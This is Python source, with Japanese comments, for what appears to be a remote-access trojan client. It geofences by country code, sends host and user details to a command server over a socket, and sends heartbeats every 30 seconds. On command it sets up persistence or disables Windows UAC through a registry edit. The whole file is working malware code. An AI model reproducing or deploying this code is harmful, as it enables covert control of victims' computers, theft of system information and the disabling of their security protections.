import socket
import uuid
import platform
import psutil
import time
import json
import threading
import os
import getpass
import sys
import requests
import util

def check_country_code():
    try:
        # IP情報を取得する
        response = requests.get('https://ipinfo.io/country')
        response.raise_for_status()  # HTTPエラーをチェック
        
        # 国コードを取得する
        country_code = response.text.strip()
        allowed_countries = {'RU', 'BY', 'KP', 'CN', 'JP'}
        
        # 国コードが許可されたものでない場合、プログラムを終了する
        if country_code not in allowed_countries:
            sys.exit(1)  # 非ゼロでプログラムを終了

    except requests.RequestException as e:
        sys.exit(1)  # 非ゼロでプログラムを終了

def get_system_info():
    return {
        "hostname": platform.node(),
        "username": platform.uname().node,
        "global_ip": requests.get('https://ifconfig.me').text,  # ここではダミーのIPアドレスを使用します。本番ではグローバルIPを取得してください。
        "os_name": platform.system(),
        "os_version": platform.version(),
        "cpu_usage": psutil.cpu_percent(),
        "disk_usage": psutil.disk_usage('/').percent
    }

def create_session_id():
    return str(uuid.uuid4()) + getpass.getuser()[13:]

def send_periodic_updates(s, session_id, system_info):
    while True:
        update_data = {
            "session_id": session_id,
            "username": system_info["username"],
            "cpu_usage": psutil.cpu_percent(),
            "disk_usage": psutil.disk_usage('/').percent
        }
        s.sendall(json.dumps(update_data).encode())
        time.sleep(30)

def receive_messages(s, session_id):
    global webcam_thread
    while True:
        try:
            data = s.recv(1024)
            if data:
                message = data.decode().strip()
                print(f"Received from server: {message}")
                
                # "all:" で始まるメッセージを処理
                if message.startswith("all:"):
                    broadcast_message = message[len("all:"):].strip()
                    print(f"Broadcast message to all clients: {broadcast_message}")
                    # ブロードキャストメッセージに対する処理をここに追加
                    # 例: 特定のコマンドを実行するなど
                    continue

                # クライアント個別のメッセージを処理
                if message == "exit":
                    print("Exiting as per server's instruction.")
                    s.close()
                    os._exit(0)
                    break
                if message == "persist":
                    a = util.persist()
                    
                if message == "DisableUAC":
                    os.system("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")

        except ConnectionResetError:
            break

def main():
    check_country_code()
    server_ip = '127.0.0.1'
    server_port = 12345

    session_id = create_session_id()
    system_info = get_system_info()
    initial_data = {
        "session_id": session_id,
        **system_info
    }

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, server_port))
        s.sendall(json.dumps(initial_data).encode())

        # サーバーからのメッセージを待つスレッドを開始
        threading.Thread(target=receive_messages, args=(s, session_id), daemon=True).start()

        # 定期的に更新を送信するスレッドを開始
        send_periodic_updates(s, session_id, system_info)

if __name__ == "__main__":
    main()
